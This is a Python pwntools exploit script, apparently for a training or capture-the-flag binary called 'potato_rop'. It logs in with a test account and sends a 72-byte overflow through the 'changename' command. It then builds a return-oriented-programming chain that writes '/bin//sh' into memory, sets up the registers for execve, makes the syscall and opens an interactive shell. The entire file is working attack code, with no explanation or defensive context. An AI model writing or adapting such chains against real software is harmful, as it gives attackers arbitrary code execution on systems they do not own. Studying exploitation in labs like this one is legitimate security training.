#!/usr/bin/env python3

from pwn import *
from struct import pack
import sys


elf = ELF("./potato_rop")

process = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(process, '''
continue
''')

print(process.recvuntil(b"cmd> ")) # username
process.sendline(b"login")
# test user
process.sendline(b"peter")
process.sendline(b"12345")
print(process.recvuntil(b"cmd> ")) # username
# logged in
#p.interactive()
process.sendline(b"changename")

# Padding goes here
p = b'\x41'*72

p += pack('<Q', 0x000000000010d37d) # pop rdx ; ret
p += pack('<Q', 0x00000000001e7000) # @ .data
p += pack('<Q', 0x0000000000043067) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x0000000000038a7c) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', 0x000000000010d37d) # pop rdx ; ret
p += pack('<Q', 0x00000000001e7008) # @ .data + 8
p += pack('<Q', 0x00000000000b9a05) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000038a7c) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', 0x000000000002a205) # pop rdi ; ret
p += pack('<Q', 0x00000000001e7000) # @ .data
p += pack('<Q', 0x000000000002bb39) # pop rsi ; ret
p += pack('<Q', 0x00000000001e7008) # @ .data + 8
p += pack('<Q', 0x000000000010d37d) # pop rdx ; ret
p += pack('<Q', 0x00000000001e7008) # @ .data + 8
p += pack('<Q', 0x00000000000b9a05) # xor rax, rax ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000cd9e0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000000284a6) # syscall

process.sendline(p)

process.interactive()



